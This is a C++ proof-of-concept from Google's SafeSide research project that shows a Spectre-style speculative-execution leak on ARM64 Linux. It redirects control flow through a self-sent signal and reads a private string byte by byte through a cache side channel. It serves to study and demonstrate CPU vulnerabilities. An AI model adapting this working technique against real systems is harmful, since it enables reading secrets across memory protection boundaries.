/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "compiler_specifics.h"

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_labels.h"
#include "utils.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Architecturally access the safe offset.
    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[safe_offset]));

    // Sends a SIGUSR1 signal to itself. The signal handler shifts the control
    // flow to the "afterspeculation" label.
    // We don't want to use the "syscall" library function in order to avoid
    // Spectre v2 effects that the CPU jumps over that call, because we cannot
    // serialize that later.
    asm volatile(
        "mov x8, %0\n"
        "mov x0, %1\n"
        "mov x1, %2\n"
        "svc #0\n"::"r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1));

    // Unreachable code. Speculatively access the unsafe offset.
    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGUSR1 signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigusr1(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGUSR1 signal handler.
  // Moves the instruction pointer to the "afterspeculation" label jumping to
  // the "LocalHandler" function.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
  ucontext->uc_mcontext.pc = reinterpret_cast<greg_t>(LocalHandler);
}

static void set_signal() {
  struct sigaction act;
  act.sa_sigaction = sigusr1;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGUSR1, &act, NULL);
}

int main() {
  set_signal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
